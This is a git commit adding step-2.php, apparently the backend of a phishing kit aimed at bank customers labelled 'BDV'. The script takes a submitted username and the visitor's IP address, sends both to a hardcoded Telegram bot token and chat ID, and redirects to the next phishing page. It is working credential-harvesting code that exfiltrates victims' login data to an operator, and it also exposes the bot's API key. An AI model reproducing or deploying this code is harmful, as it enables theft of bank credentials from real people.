12bbffc8fc26203cfc063d50775be172c24965fd
zearbur <gadsonline90@gmail.com>
2024-11-01 10:57:12 -0600

    Add files via upload

---
+++ step-2.php
@@ -0,0 +1,27 @@
+<?php
+// Recoger los datos del formulario
+$correo = $_POST['nombre'];
+
+
+$ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del cliente
+
+// API key del chatbot de Telegram
+$bot_api_key = '7981458799:AAEGfcOcBjrokbZTKiGNyUqRfjWr65chHQM';
+
+// ID del chat al que se enviará el mensaje
+$chat_id = '6734431637';
+
+// Mensaje que se enviará al chatbot
+$mensaje_para_chatbot = "Usuario BDV @Usuario\n" . "usar: " . $correo .  "\nip: " . $ip;
+
+// URL de la API de Telegram para enviar mensajes
+$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);
+
+// Enviar el mensaje al chatbot de Telegram
+$response = file_get_contents($telegram_url);
+
+// Redirigir a index.php
+header("Location: index2.html");
+exit;
+
+?>
